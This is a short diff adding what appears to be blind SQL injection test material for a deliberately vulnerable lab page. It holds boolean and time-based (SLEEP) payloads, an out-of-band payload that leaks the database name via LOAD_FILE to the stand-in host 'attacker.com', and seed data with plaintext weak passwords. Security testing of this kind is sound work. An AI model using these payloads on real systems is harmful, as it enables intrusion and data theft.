@@ -1,0 +1,12 @@
+/blindsql/insert_vuln.php?user=1=1&pass=ok
+/blindsql/insert_vuln.php?user=1=2&pass=fail
+user=IF(LENGTH(DATABASE())=8,SLEEP(5),1=1)&pass=test
+user=IF((SELECT COUNT(*) FROM users)>2,1=1,1=2)&pass=content
+user=IF(LENGTH(DATABASE())=8,LOAD_FILE(CONCAT('\\\\',(SELECT DATABASE()),'.attacker.com\\abc')),1=2)&pass=oob
+
+
+
+INSERT INTO users (username, password) VALUES
+('admin', 'admin123'),
+('bob', 'bobpass'),
+('alice', 'alicepass');
